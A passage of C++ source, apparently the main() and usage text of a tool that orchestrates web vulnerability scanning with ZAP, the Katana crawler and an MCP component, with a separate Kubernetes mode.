            for(int j=i+1;j<argc;++j) c.katana_args.push_back(std::string(argv[j]));
            break;
        }
    }
    return c;
}

int main(int argc, char** argv){
#ifdef _WIN32
    // UTF-8 console + ANSI VT si possible
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    enable_ansi_colors();
#endif

    CLIOptions cli = parse_cli(argc, argv);

    // MODE K8S
    if (cli.k8s) {
        if (cli.mcp.empty()) { logerr("Missing --mcp"); return 1; }
        AgentOptions opt;
        opt.host = cli.host; opt.port = cli.port; opt.apikey = cli.apikey;
        opt.baseurl = cli.baseurl.empty()? "https://kubernetes.default.svc" : cli.baseurl;
        opt.outdir = cli.outdir; opt.mcp_path = cli.mcp; opt.wait_browse = false;

        // chemins K8s
        fs::path K(cli.kube_dir);
#ifdef _WIN32
        if (!cli.kubeconfig.empty()) { _putenv_s("KUBECONFIG", cli.kubeconfig.c_str()); }
#else
        if (!cli.kubeconfig.empty()) { setenv("KUBECONFIG", cli.kubeconfig.c_str(), 1); }
#endif
        g_kube_dir = K;
        g_kubeconfig = cli.kubeconfig;
        g_kubecontext = cli.kubecontext;

        bool ok = run_agentfactory_k8s(opt);
        return ok?0:2;
    }

    // MODE WEB
    if(cli.agentfactory){
        if(cli.mcp.empty() || cli.baseurl.empty()){ logerr("Missing --mcp or --baseurl"); return 1; }

        // ===== Wiring Katana -> global state =====
        g_use_katana = cli.use_katana;
        g_katana_bin_explicit = cli.katana_bin;
        g_katana_passthrough = cli.katana_args;

        AgentOptions opt;
        opt.host=cli.host; opt.port=cli.port; opt.apikey=cli.apikey;
        opt.baseurl=cli.baseurl; opt.outdir=cli.outdir; opt.mcp_path=cli.mcp; opt.wait_browse=cli.wait_browse;
        if (!cli.zapcli.empty()) opt.zapcli_path = cli.zapcli;

        bool ok = run_agentfactory(opt);
        return ok?0:2;
    }

    // Help / Usage
    std::cout <<
    "Usage:\n"
    "  Web mode:\n"
    "    --agentfactory --mcp <MCP> --baseurl <url>\n"
    "      [--zapcli <ZAP-CLI>] [--apikey <key>] [--host <h>] [--port <p>] [--wait-browse] [--outdir <dir>]\n"
    "    Katana (optional crawler, merged into target list):\n"
    "      --katana [--katana-bin <path>] [-- <katana args pass-through>]\n"
    "      Examples:\n"
    "        --katana -- -depth 3 -jsl -crawl-scope all\n"
    "        --katana --katana-bin ./kube/katana -- -proxy-url http://127.0.0.1:8888\n"
    "\n"
    "  K8s mode:\n"
    "    --k8s --mcp <MCP> [--kube-dir kube] [--kubeconfig <path>] [--context <name>] [--outdir <dir>] [--baseurl <api-url>]\n"
    "\n"
    "Notes:\n"
    "  - Katana URLs sont fusionnées avec celles de MCP et WaybackURLs, puis optionnellement\n"
    "    'accessUrl' via ZAP (passive crawl warm-up).\n"
    "  - Tous les artefacts sont stockés sous <outdir>/<host>_<timestamp>/.\n";
    return 1;
}
